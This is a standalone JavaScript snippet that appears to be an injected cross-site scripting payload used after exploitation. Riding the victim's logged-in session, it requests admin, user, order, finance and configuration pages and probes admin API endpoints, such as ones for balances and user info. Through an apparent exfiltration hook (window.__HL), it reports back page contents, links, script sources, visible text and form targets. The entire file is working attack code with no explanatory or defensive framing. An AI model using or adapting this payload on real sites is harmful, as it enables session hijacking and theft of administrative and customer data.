(function(){
var P=window.__HL;if(!P)return;
if(window.__CMD)return;
function g(u,o){return fetch(u,Object.assign({credentials:"include"},o||{}))}
var PG=["/","/admin/main/index","/admin/main/home","/admin/user/list","/admin/user/index",
"/sys/main","/sys/user/list","/manage/index","/user/list","/config/index","/admin/config/index",
"/order/list","/admin/order/list","/finance/index","/stat/index"];
var i=0;
(function nx(){
  if(i>=PG.length){return}
  var u=PG[i++];
  g(u).then(function(r){return r.text().then(function(t){P.post("pg",u+" "+r.status+" "+t.length+"\n"+t.slice(0,1500))})})
   .catch(function(e){P.post("pgerr",u)}).then(function(){setTimeout(nx,220)});
})();
try{
  var S=[].map.call(document.querySelectorAll("script[src]"),function(x){return x.src});
  var A=[].map.call(document.querySelectorAll("a[href]"),function(x){return x.getAttribute("href")});
  P.post("srcs",S.join("\n"));P.post("links",A.slice(0,80).join("\n"));
  P.post("text",(document.body.innerText||"").slice(0,1200));
  P.post("forms",[].map.call(document.forms,function(f){return f.action+" "+f.method}).join("\n"));
}catch(e){P.post("hverr",String(e))}
function probe(list){
  list.forEach(function(u,k){
    setTimeout(function(){
      g(u).then(function(r){return r.text().then(function(t){
        P.post(r.status===200?"hit200":"probe",r.status+" "+u+" "+t.length+"\n"+t.slice(0,600))})}).catch(function(){});
    },k*180);
  });
}
probe(["/api/Admin/GetMsg","/api/AppConfig/GetConfig","/api/AppConfigV2/GetConfig","/api/Vest/GetData?key=x",
"/api/Mall/GetConfig","/api/Admin/GetUserInfo","/api/Admin/GetBalance"]);
window.__CMD=1;
})();
